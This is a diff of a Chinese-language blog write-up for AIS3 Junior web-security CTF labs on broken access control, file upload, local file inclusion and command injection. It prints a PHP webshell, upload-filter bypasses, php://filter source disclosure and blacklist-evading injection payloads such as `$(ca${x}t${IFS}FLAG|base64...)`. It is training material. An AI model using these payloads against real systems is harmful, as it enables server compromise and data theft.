@@ -49,12 +49,12 @@
 
   
   
-    <meta name="description" content="AIS3 junior DAY2 上午 網頁安全[TOC] 01 - Broken Access ControlBAC01隨便打一個名子login查看url http:&#x2F;&#x2F;ctfd-ais3.crazyfirelee.tw:9001&#x2F;user將user改成admin  AIS3_Junior{FirstBROKENAccessControl;}  BAC02到Product List裡面觀察每個">
+    <meta name="description" content="AIS3 junior DAY2 上午 網頁安全 [TOC]  01 - Broken Access Control  BAC01 隨便打一個名子login 查看url http:&#x2F;&#x2F;ctfd-ais3.crazyfirelee.tw:9001&#x2F;user 將user改成admin   AIS3_Junior{FirstBROKENAccessControl;}   BAC02 到Product">
 <meta property="og:type" content="article">
 <meta property="og:title" content="AIS3 junior DAY2 網頁安全 writeup">
 <meta property="og:url" content="http://example.com/2024/10/07/AIS3%20junior/AIS3%20junior%20DAY2%20%E7%B6%B2%E9%A0%81%E5%AE%89%E5%85%A8%20writeup/index.html">
 <meta property="og:site_name" content="冥夜小站">
-<meta property="og:description" content="AIS3 junior DAY2 上午 網頁安全[TOC] 01 - Broken Access ControlBAC01隨便打一個名子login查看url http:&#x2F;&#x2F;ctfd-ais3.crazyfirelee.tw:9001&#x2F;user將user改成admin  AIS3_Junior{FirstBROKENAccessControl;}  BAC02到Product List裡面觀察每個">
+<meta property="og:description" content="AIS3 junior DAY2 上午 網頁安全 [TOC]  01 - Broken Access Control  BAC01 隨便打一個名子login 查看url http:&#x2F;&#x2F;ctfd-ais3.crazyfirelee.tw:9001&#x2F;user 將user改成admin   AIS3_Junior{FirstBROKENAccessControl;}   BAC02 到Product">
 <meta property="og:locale" content="zh_TW">
 <meta property="og:image" content="https://hackmd.io/_uploads/B1X-5r3cA.png">
 <meta property="og:image" content="https://hackmd.io/_uploads/HkwJiB39R.png">
@@ -284,7 +284,7 @@
   <h3 class="toc-title">文章目錄</h3>
   <div class="sidebar-toc-wrapper toc-div-class" >
       
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#AIS3-junior-DAY2-%E4%B8%8A%E5%8D%88-%E7%B6%B2%E9%A0%81%E5%AE%89%E5%85%A8"><span class="toc-text">AIS3 junior DAY2 上午 網頁安全</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#01-Broken-Access-Control"><span class="toc-text">01 - Broken Access Control</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#BAC01"><span class="toc-text">BAC01</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BAC02"><span class="toc-text">BAC02</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BAC03"><span class="toc-text">BAC03</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#02-File-Upload"><span class="toc-text">02 - File Upload</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#FIL01"><span class="toc-text">FIL01</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FIL02"><span class="toc-text">FIL02</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#03-Local-File-Inclusion"><span class="toc-text">03 - Local File Inclusion</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#LFI01"><span class="toc-text">LFI01</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LFI02"><span class="toc-text">LFI02</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#05-Command-Injection"><span class="toc-text">05 - Command Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CMD01"><span class="toc-text">CMD01</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CMD02"><span class="toc-text">CMD02</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CMD03"><span class="toc-text">CMD03</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Bonus-CMD06"><span class="toc-text">[Bonus] CMD06</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#06-SQL-Injection"><span class="toc-text">06 - SQL Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL1"><span class="toc-text">SQL1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL2"><span class="toc-text">SQL2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#07-Server-Side-Template-Injection"><span class="toc-text">07 - Server-Side Template Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#STI01"><span class="toc-text">STI01</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#STI02"><span class="toc-text">STI02</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#08-Server-Side-Request-Forgery"><span class="toc-text">08 - Server-Side Request Forgery</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SRF01"><span class="toc-text">SRF01</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SRF02"><span class="toc-text">SRF02</span></a></li></ol></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ais3-junior-day2-%E4%B8%8A%E5%8D%88-%E7%B6%B2%E9%A0%81%E5%AE%89%E5%85%A8"><span class="toc-text"> AIS3 junior DAY2 上午 網頁安全</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#01-broken-access-control"><span class="toc-text"> 01 - Broken Access Control</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#bac01"><span class="toc-text"> BAC01</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bac02"><span class="toc-text"> BAC02</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bac03"><span class="toc-text"> BAC03</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#02-file-upload"><span class="toc-text"> 02 - File Upload</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#fil01"><span class="toc-text"> FIL01</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fil02"><span class="toc-text"> FIL02</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#03-local-file-inclusion"><span class="toc-text"> 03 - Local File Inclusion</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#lfi01"><span class="toc-text"> LFI01</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#lfi02"><span class="toc-text"> LFI02</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#05-command-injection"><span class="toc-text"> 05 - Command Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#cmd01"><span class="toc-text"> CMD01</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cmd02"><span class="toc-text"> CMD02</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cmd03"><span class="toc-text"> CMD03</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bonus-cmd06"><span class="toc-text"> [Bonus] CMD06</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#06-sql-injection"><span class="toc-text"> 06 - SQL Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sql1"><span class="toc-text"> SQL1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sql2"><span class="toc-text"> SQL2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#07-server-side-template-injection"><span class="toc-text"> 07 - Server-Side Template Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sti01"><span class="toc-text"> STI01</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sti02"><span class="toc-text"> STI02</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#08-server-side-request-forgery"><span class="toc-text"> 08 - Server-Side Request Forgery</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#srf01"><span class="toc-text"> SRF01</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#srf02"><span class="toc-text"> SRF02</span></a></li></ol></li></ol></li></ol>
       
   </div>
 </div>
@@ -297,15 +297,15 @@
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>文章</div>
-    <div class="sidebar-state-number">31</div>
+    <div class="sidebar-state-number">33</div>
   </div>
   <div class="sidebar-state-category">
     <div>分類</div>
-    <div class="sidebar-state-number">6</div>
+    <div class="sidebar-state-number">7</div>
   </div>
   <div class="sidebar-state-tag">
     <div>標籤</div>
-    <div class="sidebar-state-number">8</div>
+    <div class="sidebar-state-number">10</div>
   </div>
 </div>
 <div class="sidebar-social">
@@ -395,98 +395,171 @@
     <div class="e-content article-entry" itemprop="articleBody">
       
       
-        <h1 id="AIS3-junior-DAY2-上午-網頁安全"><a href="#AIS3-junior-DAY2-上午-網頁安全" class="headerlink" title="AIS3 junior DAY2 上午 網頁安全"></a>AIS3 junior DAY2 上午 網頁安全</h1><p>[TOC]</p>
-<h2 id="01-Broken-Access-Control"><a href="#01-Broken-Access-Control" class="headerlink" title="01 - Broken Access Control"></a>01 - Broken Access Control</h2><h3 id="BAC01"><a href="#BAC01" class="headerlink" title="BAC01"></a>BAC01</h3><p>隨便打一個名子login<br>查看url <a target="_blank" rel="noopener" href="http://ctfd-ais3.crazyfirelee.tw:9001/user">http://ctfd-ais3.crazyfirelee.tw:9001/user</a><br>將<code>user</code>改成<code>admin</code><br><img src="https://hackmd.io/_uploads/B1X-5r3cA.png" alt="image"></p>
+        <h1 id="ais3-junior-day2-上午-網頁安全"><a class="markdownIt-Anchor" href="#ais3-junior-day2-上午-網頁安全"></a> AIS3 junior DAY2 上午 網頁安全</h1>
+<p>[TOC]</p>
+<h2 id="01-broken-access-control"><a class="markdownIt-Anchor" href="#01-broken-access-control"></a> 01 - Broken Access Control</h2>
+<h3 id="bac01"><a class="markdownIt-Anchor" href="#bac01"></a> BAC01</h3>
+<p>隨便打一個名子login<br />
+查看url <a target="_blank" rel="noopener" href="http://ctfd-ais3.crazyfirelee.tw:9001/user">http://ctfd-ais3.crazyfirelee.tw:9001/user</a><br />
+將<code>user</code>改成<code>admin</code><br />
+<img src="https://hackmd.io/_uploads/B1X-5r3cA.png" alt="image" /></p>
 <blockquote>
 <p>AIS3_Junior{FirstBROKENAccessControl;}</p>
 </blockquote>
-<h3 id="BAC02"><a href="#BAC02" class="headerlink" title="BAC02"></a>BAC02</h3><p>到<code>Product List</code>裡面觀察每個 <code>View Details</code>的 url 發現後面都有編號且唯獨少了4<br>將4打上去url試試看 <a target="_blank" rel="noopener" href="http://ctfd-ais3.crazyfirelee.tw:9002/product/4">http://ctfd-ais3.crazyfirelee.tw:9002/product/4</a><br><img src="https://hackmd.io/_uploads/HkwJiB39R.png" alt="image"><br>點<code>buy</code>進去拿到flag<br><img src="https://hackmd.io/_uploads/Hk-fsS29R.png" alt="image"></p>
+<h3 id="bac02"><a class="markdownIt-Anchor" href="#bac02"></a> BAC02</h3>
+<p>到<code>Product List</code>裡面觀察每個 <code>View Details</code>的 url 發現後面都有編號且唯獨少了4<br />
+將4打上去url試試看 <a target="_blank" rel="noopener" href="http://ctfd-ais3.crazyfirelee.tw:9002/product/4">http://ctfd-ais3.crazyfirelee.tw:9002/product/4</a><br />
+<img src="https://hackmd.io/_uploads/HkwJiB39R.png" alt="image" /><br />
+點<code>buy</code>進去拿到flag<br />
+<img src="https://hackmd.io/_uploads/Hk-fsS29R.png" alt="image" /></p>
 <blockquote>
 <p>AIS3_Junior{BroJustFoundBabyIDORVulnerability}</p>
 </blockquote>
-<h3 id="BAC03"><a href="#BAC03" class="headerlink" title="BAC03"></a>BAC03</h3><p>先用第一題的方法試試看 將url後面改成<code>admin</code><br><img src="https://hackmd.io/_uploads/BJaS9L25C.png" alt="image"><br>沒有辦法得到flag<br>換另一種方法 用linux的<code>curl</code>試試看</p>
+<h3 id="bac03"><a class="markdownIt-Anchor" href="#bac03"></a> BAC03</h3>
+<p>先用第一題的方法試試看 將url後面改成<code>admin</code><br />
+<img src="https://hackmd.io/_uploads/BJaS9L25C.png" alt="image" /><br />
+沒有辦法得到flag<br />
+換另一種方法 用linux的<code>curl</code>試試看</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://ctfd-ais3.crazyfirelee.tw:9003/admin</span><br></pre></td></tr></table></figure>
-<p><img src="https://hackmd.io/_uploads/SyWzoU35R.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/SyWzoU35R.png" alt="image" /></p>
 <blockquote>
 <p>AIS3_Junior{BabyBRokenAccEssControoooooool}</p>
 </blockquote>
-<h2 id="02-File-Upload"><a href="#02-File-Upload" class="headerlink" title="02 - File Upload"></a>02 - File Upload</h2><h3 id="FIL01"><a href="#FIL01" class="headerlink" title="FIL01"></a>FIL01</h3><p>先寫一個webshell</p>
+<h2 id="02-file-upload"><a class="markdownIt-Anchor" href="#02-file-upload"></a> 02 - File Upload</h2>
+<h3 id="fil01"><a class="markdownIt-Anchor" href="#fil01"></a> FIL01</h3>
+<p>先寫一個webshell</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>檔名用<code>.php</code>結尾<br>將webshell上傳<br><img src="https://hackmd.io/_uploads/rk0KOShqA.png" alt="image"></p>
-<p>將url改成 <a target="_blank" rel="noopener" href="http://ctfd-ais3.crazyfirelee.tw:9011/uploads/a764c_108.160.138.201.php">http://ctfd-ais3.crazyfirelee.tw:9011/uploads/a764c_108.160.138.201.php</a><br>利用剛才上傳的webshell<br>將命令打在url後面<code>?cmd=ls ../</code><br>結果如下圖<em>找到了FLAG</em><br><img src="https://hackmd.io/_uploads/rye_PS3q0.png" alt="image"></p>
-<p>將命令改成<code>?cmd=cat ../FLAG</code><br><img src="https://hackmd.io/_uploads/r13xKrn90.png" alt="image"></p>
+<p>檔名用<code>.php</code>結尾<br />
+將webshell上傳<br />
+<img src="https://hackmd.io/_uploads/rk0KOShqA.png" alt="image" /></p>
+<p>將url改成 <a target="_blank" rel="noopener" href="http://ctfd-ais3.crazyfirelee.tw:9011/uploads/a764c_108.160.138.201.php">http://ctfd-ais3.crazyfirelee.tw:9011/uploads/a764c_108.160.138.201.php</a><br />
+利用剛才上傳的webshell<br />
+將命令打在url後面<code>?cmd=ls ../</code><br />
+結果如下圖<em>找到了FLAG</em><br />
+<img src="https://hackmd.io/_uploads/rye_PS3q0.png" alt="image" /></p>
+<p>將命令改成<code>?cmd=cat ../FLAG</code><br />
+<img src="https://hackmd.io/_uploads/r13xKrn90.png" alt="image" /></p>
 <blockquote>
 <p>AIS3_Junior{FirstWEBSHELLXDDD}</p>
 </blockquote>
-<h3 id="FIL02"><a href="#FIL02" class="headerlink" title="FIL02"></a>FIL02</h3><p>先寫一個webshell</p>
+<h3 id="fil02"><a class="markdownIt-Anchor" href="#fil02"></a> FIL02</h3>
+<p>先寫一個webshell</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>將檔名改成 <code>(隨你喜歡).jpg.php </code><br>上傳時用brup將他攔下來<br><img src="https://hackmd.io/_uploads/Bkj2HBn5C.png" alt="image"><br>將<code>Contect -Type </code>後面改成 <code>image/jpg</code><br><code>forward</code>的結果如圖<br><img src="https://hackmd.io/_uploads/B1IyESn50.png" alt="image"></p>
-<p>將url改成 <a target="_blank" rel="noopener" href="http://ctfd-ais3.crazyfirelee.tw:9012/uploads/2a54e_108.160.138.201.php">http://ctfd-ais3.crazyfirelee.tw:9012/uploads/2a54e_108.160.138.201.php</a><br>利用剛才上傳的webshell<br>將命令打在url後面<code>?cmd=ls ../</code><br>結果如下圖<em>找到了FLAG</em><br><img src="https://hackmd.io/_uploads/rye_PS3q0.png" alt="image"></p>
-<p>將命令改成<code>?cmd=cat ../FLAG</code><br><img src="https://hackmd.io/_uploads/ryF6DH25A.png" alt="image"></p>
+<p>將檔名改成 <code>(隨你喜歡).jpg.php </code><br />
+上傳時用brup將他攔下來<br />
+<img src="https://hackmd.io/_uploads/Bkj2HBn5C.png" alt="image" /><br />
+將<code>Contect -Type </code>後面改成 <code>image/jpg</code><br />
+<code>forward</code>的結果如圖<br />
+<img src="https://hackmd.io/_uploads/B1IyESn50.png" alt="image" /></p>
+<p>將url改成 <a target="_blank" rel="noopener" href="http://ctfd-ais3.crazyfirelee.tw:9012/uploads/2a54e_108.160.138.201.php">http://ctfd-ais3.crazyfirelee.tw:9012/uploads/2a54e_108.160.138.201.php</a><br />
+利用剛才上傳的webshell<br />
+將命令打在url後面<code>?cmd=ls ../</code><br />
+結果如下圖<em>找到了FLAG</em><br />
+<img src="https://hackmd.io/_uploads/rye_PS3q0.png" alt="image" /></p>
+<p>將命令改成<code>?cmd=cat ../FLAG</code><br />
+<img src="https://hackmd.io/_uploads/ryF6DH25A.png" alt="image" /></p>
 <blockquote>
 <p>AIS3_Junior{BabyUploadBypass}</p>
 </blockquote>
-<h2 id="03-Local-File-Inclusion"><a href="#03-Local-File-Inclusion" class="headerlink" title="03 - Local File Inclusion"></a>03 - Local File Inclusion</h2><h3 id="LFI01"><a href="#LFI01" class="headerlink" title="LFI01"></a>LFI01</h3><p>照片很可疑<br>將照片url複製 <a target="_blank" rel="noopener" href="http://ctfd-ais3.crazyfirelee.tw:9021/include.php?GetType=file_get_contents&file=static/bitcoinCat.jpg">http://ctfd-ais3.crazyfirelee.tw:9021/include.php?GetType=file_get_contents&amp;file=static/bitcoinCat.jpg</a></p>
+<h2 id="03-local-file-inclusion"><a class="markdownIt-Anchor" href="#03-local-file-inclusion"></a> 03 - Local File Inclusion</h2>
+<h3 id="lfi01"><a class="markdownIt-Anchor" href="#lfi01"></a> LFI01</h3>
+<p>照片很可疑<br />
+將照片url複製 <a target="_blank" rel="noopener" href="http://ctfd-ais3.crazyfirelee.tw:9021/include.php?GetType=file_get_contents&amp;file=static/bitcoinCat.jpg">http://ctfd-ais3.crazyfirelee.tw:9021/include.php?GetType=file_get_contents&amp;file=static/bitcoinCat.jpg</a></p>
 <p>利用上課所教的<code>php://filter/read=convert.base64-encode/resource=index.php</code></p>
 <p>先把<code>static/bitcoinCat.jpg</code>給刪掉</p>
-<p>把<code>php://filter/read=convert.base64-encode/resource=index.php</code>加進去url中<br>改成 <a target="_blank" rel="noopener" href="http://ctfd-ais3.crazyfirelee.tw:9021/include.php?GetType=file_get_contents&file=php://filter/read=convert.base64-encode/resource=index.php">http://ctfd-ais3.crazyfirelee.tw:9021/include.php?GetType=file_get_contents&amp;file=php://filter/read=convert.base64-encode/resource=index.php</a></p>
-<p>獲得一段base64加密過的東西<img src="https://hackmd.io/_uploads/Bk9U6rn5A.png" alt="image"></p>
-<p>全選複製後去先上平台解密<br><img src="https://hackmd.io/_uploads/Hkv9aBnqC.png" alt="image"></p>
-<p>得到帳號:<code>admin</code> 密碼:<code>CATLOVEBITCOINMEOWMEOW</code><br>得到flag</p>
-<p><img src="https://hackmd.io/_uploads/HyWAaH2c0.png" alt="image"></p>
+<p>把<code>php://filter/read=convert.base64-encode/resource=index.php</code>加進去url中<br />
+改成 <a target="_blank" rel="noopener" href="http://ctfd-ais3.crazyfirelee.tw:9021/include.php?GetType=file_get_contents&amp;file=php://filter/read=convert.base64-encode/resource=index.php">http://ctfd-ais3.crazyfirelee.tw:9021/include.php?GetType=file_get_contents&amp;file=php://filter/read=convert.base64-encode/resource=index.php</a></p>
+<p>獲得一段base64加密過的東西<img src="https://hackmd.io/_uploads/Bk9U6rn5A.png" alt="image" /></p>
+<p>全選複製後去先上平台解密<br />
+<img src="https://hackmd.io/_uploads/Hkv9aBnqC.png" alt="image" /></p>
+<p>得到帳號:<code>admin</code> 密碼:<code>CATLOVEBITCOINMEOWMEOW</code><br />
+得到flag</p>
+<p><img src="https://hackmd.io/_uploads/HyWAaH2c0.png" alt="image" /></p>
 <blockquote>
-<p>AIS3_Junior{php:&#x2F;&#x2F;filter&#x2F;BabyPHPLFI.b64decode()}</p>
+<p>AIS3_Junior{php://filter/BabyPHPLFI.b64decode()}</p>
 </blockquote>
-<h3 id="LFI02"><a href="#LFI02" class="headerlink" title="LFI02"></a>LFI02</h3><p>像FIL01和FIL02一樣 </p>
+<h3 id="lfi02"><a class="markdownIt-Anchor" href="#lfi02"></a> LFI02</h3>
+<p>像FIL01和FIL02一樣</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>將webshell檔案上傳<br><img src="https://hackmd.io/_uploads/H1XlhI3qA.png" alt="image"></p>
-<p>發現檔案在<code>tmp</code>底下 而tmp又在根目錄底下<br>所以我們要利用..&#x2F;..&#x2F;..&#x2F;..&#x2F; 跳到根目錄<br>在將 <code>/tmp/a764c_108.160.138.201.php</code>貼到根目錄後面<br>像是這樣 <a target="_blank" rel="noopener" href="http://ctfd-ais3.crazyfirelee.tw:9022/post.php?form=../../../../../tmp/a764c_108.160.138.201.php">http://ctfd-ais3.crazyfirelee.tw:9022/post.php?form=../../../../../tmp/a764c_108.160.138.201.php</a></p>
+<p>將webshell檔案上傳<br />
+<img src="https://hackmd.io/_uploads/H1XlhI3qA.png" alt="image" /></p>
+<p>發現檔案在<code>tmp</code>底下 而tmp又在根目錄底下<br />
+所以我們要利用…/…/…/…/ 跳到根目錄<br />
+在將 <code>/tmp/a764c_108.160.138.201.php</code>貼到根目錄後面<br />
+像是這樣 <a target="_blank" rel="noopener" href="http://ctfd-ais3.crazyfirelee.tw:9022/post.php?form=../../../../../tmp/a764c_108.160.138.201.php">http://ctfd-ais3.crazyfirelee.tw:9022/post.php?form=../../../../../tmp/a764c_108.160.138.201.php</a></p>
 <p>接著再用<code>&amp;cmd=ls</code> 獲得我們想要的檔案 <code>S3Cr3TFLAGGGGG</code></p>
-<p><img src="https://hackmd.io/_uploads/BkBv1Dh9C.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/BkBv1Dh9C.png" alt="image" /></p>
 <p>最後用<code>cat S3Cr3TFLAGGGGG</code> 將flag印出</p>
-<p><img src="https://hackmd.io/_uploads/S17ngDnqR.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/S17ngDnqR.png" alt="image" /></p>
 <blockquote>
-<p>AIS3_Junior{..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;BADBAD.php?LFI&#x3D;SUCCESS}</p>
+<p>AIS3_Junior{…/…/…/…/tmp/BADBAD.php?LFI=SUCCESS}</p>
 </blockquote>
-<h2 id="05-Command-Injection"><a href="#05-Command-Injection" class="headerlink" title="05 - Command Injection"></a>05 - Command Injection</h2><h3 id="CMD01"><a href="#CMD01" class="headerlink" title="CMD01"></a>CMD01</h3><p>先用<code>;ls</code> 查看有什麼東西</p>
-<p><img src="https://hackmd.io/_uploads/Skk8Ew3qC.png" alt="image"></p>
-<p>發現有很多像flag的東西<br>先用cat印出<code>REAL_FLAG</code><br><em>發現是騙人的</em></p>
+<h2 id="05-command-injection"><a class="markdownIt-Anchor" href="#05-command-injection"></a> 05 - Command Injection</h2>
+<h3 id="cmd01"><a class="markdownIt-Anchor" href="#cmd01"></a> CMD01</h3>
+<p>先用<code>;ls</code> 查看有什麼東西</p>
+<p><img src="https://hackmd.io/_uploads/Skk8Ew3qC.png" alt="image" /></p>
+<p>發現有很多像flag的東西<br />
+先用cat印出<code>REAL_FLAG</code><br />
+<em>發現是騙人的</em></p>
 <p>再去試試看<code>FLAG</code> 就出來了</p>
-<p><img src="https://hackmd.io/_uploads/Hyas4D3cC.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/Hyas4D3cC.png" alt="image" /></p>
 <blockquote>
 <p>AIS3_Junior{BabyCommand;InjectionXDDDddddd}</p>
 </blockquote>
-<h3 id="CMD02"><a href="#CMD02" class="headerlink" title="CMD02"></a>CMD02</h3><p>想和上一題一樣 用<code>;ls</code> 結果沒有辦法<br>上網發現<code>;echo *</code> 也有一樣的效果<br><img src="https://hackmd.io/_uploads/H1s_CwhcC.png" alt="image"><br>找到FLAG<br>用<code>;c\at F*</code>繞過黑名單 當作<code>cat FLAG</code> 得到flag</p>
+<h3 id="cmd02"><a class="markdownIt-Anchor" href="#cmd02"></a> CMD02</h3>
+<p>想和上一題一樣 用<code>;ls</code> 結果沒有辦法<br />
+上網發現<code>;echo *</code> 也有一樣的效果<br />
+<img src="https://hackmd.io/_uploads/H1s_CwhcC.png" alt="image" /><br />
+找到FLAG<br />
+用<code>;c\at F*</code>繞過黑名單 當作<code>cat FLAG</code> 得到flag</p>
 <blockquote>
 <p>AIS3_Junior{niceWordBL$()ACKListEvasion;}</p>
 </blockquote>
-<h3 id="CMD03"><a href="#CMD03" class="headerlink" title="CMD03"></a>CMD03</h3><ul>
-<li>用<code>$(l$&#123;x&#125;s|base64$&#123;IFS&#125;-w$&#123;IFS&#125;0)</code> 繞過黑名單 </li>
-<li>用base64加密列出<code>ls</code>的東西<br><del>發現跟[Bonus] CMD06一樣</del><br><del>就用跟[Bonus] CMD06一樣的解法</del></li>
-<li>用<code>$(ca$&#123;x&#125;t$&#123;IFS&#125;FLAG|base64$&#123;IFS&#125;-w$&#123;IFS&#125;0)</code>將flag以base64印出<br><img src="https://hackmd.io/_uploads/H1IZqkp5A.png" alt="image"><br><code>AIS3_Junior&#123;BashOperato|rEvasion$&#123;IFS&#125;SUCC|ESSFUL|:DDDDD&#125;</code></li>
+<h3 id="cmd03"><a class="markdownIt-Anchor" href="#cmd03"></a> CMD03</h3>
+<ul>
+<li>用<code>$(l$&#123;x&#125;s|base64$&#123;IFS&#125;-w$&#123;IFS&#125;0)</code> 繞過黑名單</li>
+<li>用base64加密列出<code>ls</code>的東西<br />
+<s>發現跟[Bonus] CMD06一樣</s><br />
+<s>就用跟[Bonus] CMD06一樣的解法</s></li>
+<li>用<code>$(ca$&#123;x&#125;t$&#123;IFS&#125;FLAG|base64$&#123;IFS&#125;-w$&#123;IFS&#125;0)</code>將flag以base64印出<br />
+<img src="https://hackmd.io/_uploads/H1IZqkp5A.png" alt="image" /><br />
+<code>AIS3_Junior&#123;BashOperato|rEvasion$&#123;IFS&#125;SUCC|ESSFUL|:DDDDD&#125;</code></li>
 </ul>
-<h3 id="Bonus-CMD06"><a href="#Bonus-CMD06" class="headerlink" title="[Bonus] CMD06"></a>[Bonus] CMD06</h3><ul>
-<li>用<code>$(l$&#123;x&#125;s|base64$&#123;IFS&#125;-w$&#123;IFS&#125;0)</code> 繞過黑名單 </li>
-<li>用base64加密列出<code>ls</code>的東西<br><img src="https://hackmd.io/_uploads/HyGrPJTcA.png" alt="image"></li>
+<h3 id="bonus-cmd06"><a class="markdownIt-Anchor" href="#bonus-cmd06"></a> [Bonus] CMD06</h3>
+<ul>
+<li>用<code>$(l$&#123;x&#125;s|base64$&#123;IFS&#125;-w$&#123;IFS&#125;0)</code> 繞過黑名單</li>
+<li>用base64加密列出<code>ls</code>的東西<br />
+<img src="https://hackmd.io/_uploads/HyGrPJTcA.png" alt="image" /></li>
 </ul>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RkxBRwptYWluLnB5CnByZXN0YXJ0LnNoCnJlcXVpcmVtZW50cy50eHQKc3RhdGljCnRlbXBsYXRlcwp1d3NnaS5pbmkK</span><br></pre></td></tr></table></figure>
 <ul>
 <li>把上述用線上解密</li>
 </ul>
-<p><img src="https://hackmd.io/_uploads/S1itwJa9A.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/S1itwJa9A.png" alt="image" /></p>
 <ul>
 <li>發現FLAG</li>
-<li>用<code>$(ca$&#123;x&#125;t$&#123;IFS&#125;FLAG|base64$&#123;IFS&#125;-w$&#123;IFS&#125;0)</code>將flag以base64印出<br><img src="https://hackmd.io/_uploads/HkbxuJpq0.png" alt="image"><br>*<code>QUlTM19KdW5pb3J7b3VvX2hpaGl9Cg==</code>用base64線上解密<br><img src="https://hackmd.io/_uploads/BkAmuk6q0.png" alt="image"></li>
+<li>用<code>$(ca$&#123;x&#125;t$&#123;IFS&#125;FLAG|base64$&#123;IFS&#125;-w$&#123;IFS&#125;0)</code>將flag以base64印出<br />
+<img src="https://hackmd.io/_uploads/HkbxuJpq0.png" alt="image" /><br />
+*<code>QUlTM19KdW5pb3J7b3VvX2hpaGl9Cg==</code>用base64線上解密<br />
+<img src="https://hackmd.io/_uploads/BkAmuk6q0.png" alt="image" /></li>
 </ul>
